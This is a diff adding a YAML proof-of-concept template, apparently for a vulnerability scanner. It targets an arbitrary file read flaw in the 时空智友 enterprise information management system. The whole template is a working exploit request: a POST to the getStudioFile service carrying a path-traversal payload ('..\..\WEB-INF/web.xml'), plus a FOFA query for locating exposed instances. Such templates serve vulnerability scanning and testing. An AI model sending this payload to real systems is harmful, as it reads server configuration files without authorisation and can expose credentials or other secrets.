@@ -1,0 +1,18 @@
+id: poc-yaml-skzy-eims-getstudiofile-anyfile-read
+info:
+  name: 时空智友企业信息管理系统 getStudioFile 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 时空智友企业信息管理系统
+  fofa: body="时空智友企业信息管理"
+requests:
+- method: POST
+  path: /formservice?service=updater.getStudioFile
+  headers:
+    Content-Type: application/json
+  data: ..\..\WEB-INF/web.xml
+  expression: status_code == 200 && contains(body,"</web-app>") && contains(body,"<listener>")
+    && contains(headers,"filename=") && contains(content_type,"application/octet-stream")
+variables: {}
+transport: http
